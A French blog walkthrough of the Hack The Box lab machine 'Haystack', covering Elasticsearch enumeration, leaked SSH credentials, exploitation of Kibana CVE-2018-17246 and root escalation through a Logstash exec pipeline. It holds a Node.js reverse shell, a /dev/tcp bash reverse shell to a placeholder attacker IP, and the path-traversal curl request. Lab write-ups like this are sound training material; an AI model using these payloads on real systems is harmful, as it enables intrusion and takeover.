@@ -1,0 +1,543 @@
+<!DOCTYPE html>
+<html lang="">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.55.6" />
+
+    
+    
+    
+
+<title>Hack The Box - Haystack • Haax - Personal Blog</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Hack The Box - Haystack"/>
+<meta name="twitter:description" content="Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges."/>
+
+<meta property="og:title" content="Hack The Box - Haystack" />
+<meta property="og:description" content="Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://haaxmax.github.io/fr/walkthroughs/hackthebox/haystack/" />
+<meta property="article:published_time" content="2019-11-09T00:00:00&#43;00:00"/>
+<meta property="article:modified_time" content="2019-11-09T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
+
+
+    
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/github.min.css">
+
+
+
+
+<link rel="stylesheet" href="/css/hyde-hyde.css">
+<link rel="stylesheet" href="/css/custom.css">
+<link rel="stylesheet" href="/css/print.min.css" media="print">
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+
+</head>
+
+
+    <body >
+        
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      
+      
+          <a href="https://haaxmax.github.io">
+          
+          
+          
+          <div class="author-image">
+            <img src="/img/icons/haax_logo.png" alt="Author Image" class="img--circle img--headshot element--center">
+          </div>
+          
+          </a>
+        
+      <p class="site__description">
+        <a href="https://haaxmax.github.io">
+         Infosec articles &amp; CTF Writeups 
+      </a>
+      </p>
+    </div>
+    <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/fr/articles/">
+						<span>Articles</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/walkthroughs/">
+						<span>Walkthroughs</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/writeups/">
+						<span>Write-Ups</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/fr/about/">
+						<span>À Propos</span>
+					</a>
+				</li>
+			 
+		
+		</li>
+	</ul>
+</div>
+
+    <p>
+      <section class="social">
+	
+	<a href="https://twitter.com/Haaxmax" target="blank"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://github.com/Haaxmax" target="blank"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	&nbsp;<a href="https://gitlab.com/Haax" target="blank"><i class="fab fa-gitlab fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+  &nbsp;<a href="https://www.root-me.org/Haax" target="blank" class="linklogo"><div class="rootme_logo logohover"></div></a>
+  
+	
+  &nbsp;<a href="http://www.aperikube.fr" target="blank" class="linklogo"><div class="aperikube_logo logohover"></div></a>
+  
+	
+	&nbsp;<a href="mailto:haax@mdamail.ch" target="blank"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	</section>
+
+    </p>
+    <div class="langSection">
+      
+      
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/haystack/" hreflang="en" lang="en" class="langLink">English</a>
+      <a rel="alternate" href="/en/walkthroughs/hackthebox/haystack/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      </div>
+    <p class="copyright">
+      &copy; 2019 Haax.
+      <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">Some Rights Reserved</a>.
+      <br/>Built with
+      <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+      
+    </p>
+  </div>
+  <div>
+  </div>
+</div>
+
+        <div class="content container">
+            
+    <article>
+  <header>
+    <h1>Hack The Box - Haystack</h1>
+    
+    
+<div class="post__meta">
+    
+    
+      <i class="fas fa-calendar-alt"></i> Nov 9, 2019
+    
+    
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 7 min read
+</div>
+
+
+  </header>
+  <div class="post">
+    <p>Haystack est une machine Linux catégorisée comme facile et plutôt intéressante, faisant intervenir ELK. L&rsquo;énumération des endpoints web et des indices permet de récupérer un accès SSH utilisateur tandis que l&rsquo;exploitation de la CVE-2018-17246 sur le composant Kibana permet de récupérer un accès plus intéressant. Enfin, l&rsquo;exploitation d&rsquo;un Logstash mal configuré permet d&rsquo;élever ses privilèges.</p>
+
+<p><strong>Disclaimer :</strong> Il s&rsquo;agit d&rsquo;une présentation plutôt rapide qui omet volontairement les différents axes de recherche. Seul les résultats effectifs ainsi qu&rsquo;une rapide démarche sont présentés.</p>
+
+<h2 id="découverte">Découverte</h2>
+
+<p>Un rapide scan de ports permet de découvrir les services présents sur la machine.</p>
+
+<pre><code>$ nmap -v -sV -sC -O -p 22,80,9200 -oA scan_nmap 10.10.10.115
+
+Nmap scan report for 10.10.10.115
+Host is up (0.042s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)
+|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)
+|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)
+80/tcp   open  http    nginx 1.12.2
+| http-methods: 
+|_  Supported Methods: GET HEAD
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (text/html).
+9200/tcp open  http    nginx 1.12.2
+|_http-favicon: Unknown favicon MD5: 6177BFB75B498E0BB356223ED76FFE43
+| http-methods: 
+|   Supported Methods: HEAD DELETE GET OPTIONS
+|_  Potentially risky methods: DELETE
+|_http-server-header: nginx/1.12.2
+|_http-title: Site doesn't have a title (application/json; charset=UTF-8).
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.2 - 4.9 (92%), Linux 3.18 (90%), Crestron XPanel control system (90%), Linux 3.16 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%)
+No exact OS matches for host (test conditions non-ideal).
+Uptime guess: 0.051 days (since Sat Aug 24 22:31:58 2019)
+TCP Sequence Prediction: Difficulty=262 (Good luck!)
+IP ID Sequence Generation: All zeros
+</code></pre>
+
+<p>Le port 80 est ouvert et propose une image à l&rsquo;utilisateur. Quelques recherches sur le fichiers sont effectuées et une base64 est trouvée dans les commentaires de l&rsquo;image.</p>
+
+<pre><code>$ strings needle.jpg
+
+*Oo!;.o|?&gt;
+.n2FrZ
+rrNMz
+#=pMr
+BN2I
+,'*'
+I$f2/&lt;-iy
+bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==
+</code></pre>
+
+<pre><code>$ echo -n &quot;bGEgYWd1amEgZW4gZWwgcGFqYXIgZXMgImNsYXZlIg==&quot; | base64 -d
+la aguja en el pajar es &quot;clave&quot;% 
+</code></pre>
+
+<p>Ce qui signifie <code>L'aiguille dans la botte de foin est &quot;la clé&quot;.</code></p>
+
+<p>Le port 9200 est également ouvert. Il s&rsquo;agit de l&rsquo;API utilisée par ELK.</p>
+
+<pre><code class="language-json">name    &quot;iQEYHgS&quot;
+cluster_name    &quot;elasticsearch&quot;
+cluster_uuid    &quot;pjrX7V_gSFmJY-DxP4tCQg&quot;
+version 
+number  &quot;6.4.2&quot;
+build_flavor    &quot;default&quot;
+build_type  &quot;rpm&quot;
+build_hash  &quot;04711c2&quot;
+build_date  &quot;2018-09-26T13:34:09.098244Z&quot;
+build_snapshot  false
+lucene_version  &quot;7.4.0&quot;
+minimum_wire_compatibility_version  &quot;5.6.0&quot;
+minimum_index_compatibility_version &quot;5.0.0&quot;
+tagline &quot;You Know, for Search&quot;
+</code></pre>
+
+<h2 id="accès-ssh-shell-utilisateur">Accès SSH - Shell utilisateur</h2>
+
+<p>Après quelques lectures sur le fonctionnement de ELK et la présentation des données, on peut effectuer quelques recherches directement via le navigateur afin d&rsquo;énumérer ce qui est présent.</p>
+
+<p>On commence par énumérer les différents indices (grossièrement, équivalent à des BDD).</p>
+
+<pre><code>http://10.10.10.115:9200/_cat/indices
+
+green  open .kibana 6tjAYZrgQ5CwwR0g6VOoRg 1 0    1 0     4kb     4kb
+yellow open quotes  ZG2D1IqkQNiNZmi2HRImnQ 5 1  253 0 262.7kb 262.7kb
+yellow open bank    eSVpNfCfREyYoVigNWcrMw 5 1 1000 0 483.2kb 483.2kb
+</code></pre>
+
+<p>Il est également possible de les récupérer en affichant l&rsquo;ensemble des éléments, ainsi que des statistiques sur chacun d&rsquo;entre eux.</p>
+
+<pre><code>http://10.10.10.115:9200/_all
+http://10.10.10.115:9200/_stats
+</code></pre>
+
+<p>On apprend également qu&rsquo;il est possible d&rsquo;effectuer des recherches via le endpoint <code>/quotes/_search?q=x</code>. Ainsi, après quelques tentatives infructueuses, on trouve un enregistrement en utilisant le mot clé &ldquo;clave&rdquo; récupéré auparavant.</p>
+
+<pre><code>http://10.10.10.115:9200/quotes/_search?q=clave
+    
+took    6
+timed_out   false
+_shards 
+total   5
+successful  5
+skipped 0
+failed  0
+hits    
+total   2
+max_score   5.9335938
+hits    
+0   
+_index  &quot;quotes&quot;
+_type   &quot;quote&quot;
+_id &quot;45&quot;
+_score  5.9335938
+_source 
+quote   &quot;Tengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg &quot;
+1   
+_index  &quot;quotes&quot;
+_type   &quot;quote&quot;
+_id &quot;111&quot;
+_score  5.3459888
+_source 
+quote   &quot;Esta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
+</code></pre>
+
+<p>La traduction des deux phrases en espagnol donne :</p>
+
+<pre><code>&quot;Je dois sauvegarder la clé pour la machine : dXNlcjogc2VjdXJpdHkg&quot;
+&quot;Cette clé ne peut pas être perdue, gardez-la ici : cGFzczogc3BhbmlzaC5pcy5rZXk=&quot;
+</code></pre>
+
+<p>Les deux chaines sont en réalités des base64 qui une fois décodées&hellip;</p>
+
+<pre><code class="language-bash">$ echo -n &quot;dXNlcjogc2VjdXJpdHkg&quot; | base64 -d
+user: security %
+
+$ echo -n &quot;cGFzczogc3BhbmlzaC5pcy5rZXk=&quot; | base64 -d
+pass: spanish.is.key% 
+</code></pre>
+
+<p>&hellip; Donnent un accès à la machine, et par extension le premier flag.</p>
+
+<pre><code>$ ssh security@10.10.10.115
+security@10.10.10.115's password: 
+Last login: Tue Sep 24 08:51:21 2019 from 10.10.12.127
+[security@haystack ~]$ whoami
+security
+</code></pre>
+
+<h2 id="cve-2018-17246-rce-avec-kibana">CVE-2018-17246 - RCE avec Kibana</h2>
+
+<p>Vient maintenant une phase de recherche et d&rsquo;énumération d&rsquo;informations sur la machine, avec pour objectif principal compromettre le compte root.</p>
+
+<p>Après quelques recherches, on se tourne vers d&rsquo;éventuelles vulnérabilités liées à ELK et notamment à la CVE-2018-17246 qui pourrait permettre une exécution de commandes.
+Le dépôt Github suivant permet de comprendre son fonctionnement ainsi que son exploitation : <a href="https://github.com/mpgn/CVE-2018-17246">https://github.com/mpgn/CVE-2018-17246</a></p>
+
+<p>Ayant un premier accès à la machine, on créé un fichier JS dans le répertoire <code>/tmp/shell.js</code>.</p>
+
+<pre><code class="language-javascript">(function(){
+    var net = require(&quot;net&quot;),
+        cp = require(&quot;child_process&quot;),
+        sh = cp.spawn(&quot;/bin/sh&quot;, []);
+    var client = new net.Socket();
+    client.connect(&lt;LPORT&gt;, &quot;&lt;ATTACKER IP&quot;, function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+</code></pre>
+
+<p>On lance un listener sur notre machine d&rsquo;attaque, sur le port souhaité : <code>nc -lvvp 6543</code>
+Puis on lance l&rsquo;exploit en local sur la machine.</p>
+
+<pre><code class="language-bash">$ curl &quot;http://127.0.0.1:5601/api/console/api_server?sense_version=%40%40SENSE_VERSION&amp;apis=../../../../../../../../../../../tmp/lol.js&quot;
+</code></pre>
+
+<pre><code>$ nc -lvvp 6543
+listening on [any] 6543 ...
+10.10.10.115: inverse host lookup failed: Unknown host
+connect to [10.10.13.211] from (UNKNOWN) [10.10.10.115] 45818
+
+whoami
+kibana
+python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+bash-4.2$ 
+</code></pre>
+
+<h2 id="escalade-de-privilèges">Escalade de Privilèges</h2>
+
+<p>Dernière ligne droite, la compromission. On dispose maintenant d&rsquo;un utilisateur &ldquo;limité&rdquo; mais néanmoins utile car ayant accès à des fichiers de configuration.</p>
+
+<p>On peut notamment voir dans le fichier de startup que logstash est lancé avec des droits root.</p>
+
+<pre><code>$ cat /etc/logstash/startup.options
+
+# user and group id to be invoked as
+#LS_USER=logstash
+#LS_GROUP=logstash
+LS_USER=root
+LS_GROUP=root
+</code></pre>
+
+<p>On trouve également des informations très intéressantes dans le répertoire <code>/etc/logstash/conf.d</code>. Des fichiers appartenant à root&hellip; Mais accessibles en lecture au groupe kibana.</p>
+
+<pre><code class="language-bash">$ ls -la
+
+drwxrwxr-x. 2 root kibana  62 jun 24 08:12 .
+drwxr-xr-x. 3 root root   183 jun 18 22:15 ..
+-rw-r-----. 1 root kibana 131 jun 20 10:59 filter.conf
+-rw-r-----. 1 root kibana 186 jun 24 08:12 input.conf
+-rw-r-----. 1 root kibana 109 jun 24 08:12 output.conf
+</code></pre>
+
+<pre><code class="language-bash">bash-4.2$ cat filter.conf
+cat filter.conf
+filter {
+    if [type] == &quot;execute&quot; {
+        grok {
+            match =&gt; { &quot;message&quot; =&gt; &quot;Ejecutar\s*comando\s*:\s+%{GREEDYDATA:comando}&quot; }
+        }
+    }
+}
+</code></pre>
+
+<pre><code class="language-bash">bash-4.2$ cat input.conf
+cat input.conf
+input {
+    file {
+        path =&gt; &quot;/opt/kibana/logstash_*&quot;
+        start_position =&gt; &quot;beginning&quot;
+        sincedb_path =&gt; &quot;/dev/null&quot;
+        stat_interval =&gt; &quot;10 second&quot;
+        type =&gt; &quot;execute&quot;
+        mode =&gt; &quot;read&quot;
+    }
+}
+</code></pre>
+
+<pre><code class="language-bash">bash-4.2$ cat output.conf
+cat output.conf
+output {
+    if [type] == &quot;execute&quot; {
+        stdout { codec =&gt; json }
+        exec {
+            command =&gt; &quot;%{comando} &amp;&quot;
+        }
+    }
+}
+</code></pre>
+
+<p>Ok&hellip; On se pose quelques minutes (ou dizaines de minutes..) et on analyse tout ça. Avec un peu de recherche, on arrive à comprendre ce qu&rsquo;il se passe, à savoir :</p>
+
+<ul>
+<li>Toutes les 10 sec, le service va lire les fichiers de <code>/opt/kibana/</code> dont le nom commence par <code>logstash_</code></li>
+<li>Un pattern &ldquo;grok&rdquo; est utilisé afin de rechercher une chaine précise</li>
+<li>Si la chaine &ldquo;Ejecutar\s<em>comando\s</em>:\s+%{GREEDYDATA:comando}&rdquo; est contenue dans la ligne de log, alors le fichier <code>output.conf</code> lance l&rsquo;exécution de la commande associée&hellip;</li>
+</ul>
+
+<p>Étant donné que le service est lancé en root, les commandes exécutées le seront également.
+Ok, il reste à construire notre payload. Il est possible de PoC le fonctionnement de l&rsquo;exploit avec des commandes classiques mais ici je mets directement en place mon reverse shell.</p>
+
+<p>De la même façon, on met en place notre listener.</p>
+
+<pre><code class="language-bash">$ nc -lvvp 6688                               
+listening on [any] 6688 ...
+</code></pre>
+
+<p>Puis on créé un fichier <code>/opt/kibana/logstash_pwn</code> qui contient la chaine correspondant au pattern, permettant d&rsquo;exécuter notre commande. Il est également possible de tester en ligne différents pattern jusqu&rsquo;à trouver une chaine correspondante : <a href="https://grokconstructor.appspot.com/do/match#result">https://grokconstructor.appspot.com/do/match#result</a></p>
+
+<pre><code class="language-bash">$ cat /opt/kibana/logstash_pwn
+Ejecutar comando : /bin/bash -i &gt;&amp; /dev/tcp/&lt;ATTACKER-IP&gt;/6688 0&gt;&amp;1
+</code></pre>
+
+<p>Quelques secondes d&rsquo;attente et&hellip;</p>
+
+<pre><code class="language-bash">$ nc -lvvp 6688
+listening on [any] 6688 ...
+10.10.10.115: inverse host lookup failed: Unknown host
+connect to [10.10.13.211] from (UNKNOWN) [10.10.10.115] 47512
+bash: no hay control de trabajos en este shell
+[root@haystack /]#
+</code></pre>
+
+<p>w00ted!</p>
+  </div>
+  
+
+<div class="post--navigation post--navigation-single">
+    
+    <a href="/fr/walkthroughs/vulnhub/quaoar-virtual-machine/" class="post--navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Quaoar Virtual Machine - Walkthrough</span>
+    </a>
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+  
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-126182747-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+<script defer src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"
+  integrity="sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy"
+  crossorigin="anonymous">
+</script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+    
+
+
+
+    </body>
+</html>
